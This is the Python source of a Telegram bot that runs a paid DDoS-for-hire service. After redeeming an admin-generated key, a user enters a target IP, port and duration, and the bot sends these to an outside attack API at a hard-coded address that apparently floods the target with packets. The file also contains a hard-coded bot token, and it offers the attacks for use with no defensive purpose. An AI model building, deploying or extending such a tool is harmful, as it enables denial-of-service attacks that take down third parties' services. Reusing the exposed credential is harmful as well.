import telebot
import time
import json
import random
import string
import os
import threading
import requests
from flask import Flask
from telebot import types

# --- FLASK FOR RAILWAY HEALTH CHECK ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIGURATION ---
TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
ADMIN_ID = 8787952549
API_URL = "http://13.203.155.253/attack"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- GLOBAL TRACKING (CONCURRENCY & SLOTS) ---
MAX_CONCURRENT = 2
running_attacks = 0
attack_slots = {} # Tracking live attacks for animation

# --- DATABASE ---
def load_data(file, default):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return default
    return default

def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_data("users.json", {})
keys = load_data("keys.json", {})

# --- START ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in users:
        users[uid] = {"expiry": 0, "name": message.from_user.first_name}
        save_data("users.json", users)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 ATTACK", "👤 PROFILE", "🎫 REDEEM", "📊 STATUS")
    
    bot.send_message(message.chat.id, f"🚀 **WELCOME TO SASTA DEVELOPER TERMINAL**\n\n**Slots Available:** `{MAX_CONCURRENT - running_attacks}/{MAX_CONCURRENT}`", reply_markup=markup)

# --- STATUS COMMAND ---
@bot.message_handler(func=lambda m: m.text == "📊 STATUS")
def status(message):
    msg = f"🛰️ **SYSTEM STATUS**\n━━━━━━━━━━━━━━\n"
    msg += f"🔥 **Active Attacks:** `{running_attacks}`\n"
    msg += f"✅ **Available Slots:** `{MAX_CONCURRENT - running_attacks}`\n"
    for uid, info in attack_slots.items():
        rem = int(info['end'] - time.time())
        msg += f"⏳ `{info['target']}` | `{rem}s left`\n"
    bot.send_message(message.chat.id, msg)

# --- ATTACK SYSTEM ---
@bot.message_handler(func=lambda m: m.text == "🚀 ATTACK")
def attack_req(message):
    global running_attacks
    uid = str(message.from_user.id)
    
    # Expiry Check
    if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 **No VIP Access!**"); return
    
    # Concurrency Limit (Strictly 2)
    if running_attacks >= MAX_CONCURRENT and int(uid) != ADMIN_ID:
        bot.reply_to(message, f"⚠️ **ALL SLOTS FULL!**\nWait for an ongoing attack to finish.\n\nSlots: `{running_attacks}/{MAX_CONCURRENT}`")
        return
    
    msg = bot.send_message(message.chat.id, "🎯 **Enter Target:** `IP PORT TIME`")
    bot.register_next_step_handler(msg, run_attack_logic)

def run_attack_logic(message):
    global running_attacks
    uid = str(message.from_user.id)
    try:
        ip, port, duration = message.text.split()
        duration_int = int(duration)
        
        running_attacks += 1
        attack_slots[uid] = {"target": f"{ip}:{port}", "end": time.time() + duration_int}

        sent = bot.send_message(message.chat.id, "🚀 **INITIALIZING ATTACK...**")
        
        def call_api():
            global running_attacks
            full_url = f"{API_URL}?ip={ip}&port={port}&time={duration}&key=DESTRUCTED"
            try: requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
            except: pass
            
            # Start Animation
            bot.edit_message_text(
                f"🔥 **ATTACK STARTED** 🔥\n━━━━━━━━━━━━━━\n"
                f"🎯 **Target:** `{ip}:{port}`\n"
                f"⏳ **Duration:** `{duration}s`\n"
                f"🚀 **Status:** `Sending Packets...`", 
                message.chat.id, sent.message_id
            )
            
            time.sleep(duration_int)
            
            # Attack End Animation & Slot Release
            running_attacks -= 1
            attack_slots.pop(uid, None)
            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED** ✅\n━━━━━━━━━━━━━━\n🎯 **Target:** `{ip}:{port}`\n💎 **Slot Released!**")

        threading.Thread(target=call_api).start()
    except:
        bot.reply_to(message, "❌ **Error!** Use: `IP PORT TIME`")

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        days = int(message.text.split()[1])
        key = "SD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
        keys[key] = days * 86400
        save_data("keys.json", keys)
        bot.reply_to(message, f"🎫 **KEY:** `{key}`")
    except: bot.reply_to(message, "`/genkey <days>`")

@bot.message_handler(func=lambda m: m.text == "🎫 REDEEM")
def redeem(message):
    msg = bot.send_message(message.chat.id, "⌨️ **Enter Key:**")
    bot.register_next_step_handler(msg, process_redeem)

def process_redeem(message):
    uid = str(message.from_user.id)
    key = message.text.strip()
    if key in keys:
        duration = keys.pop(key)
        users[uid]['expiry'] = max(users[uid].get('expiry', 0), time.time()) + duration
        save_data("users.json", users)
        save_data("keys.json", keys)
        bot.send_message(message.chat.id, "✅ **VIP ACTIVATED!**")
    else: bot.send_message(message.chat.id, "❌ **Invalid Key!**")

@bot.message_handler(func=lambda m: m.text == "👤 PROFILE")
def profile(message):
    uid = str(message.from_user.id)
    rem = int(users.get(uid, {}).get('expiry', 0) - time.time())
    days = max(0, rem // 86400)
    bot.send_message(message.chat.id, f"👤 **USER:** `{users[uid]['name']}`\n⏳ **EXPIRY:** `{days} Days`")

# --- EXECUTION ---
if __name__ == "__main__":
    threading.Thread(target=run_web).start() # For Railway
    print(">>> BOT STARTED SUCCESSFULLY!")
    bot.infinity_polling(skip_pending=True)
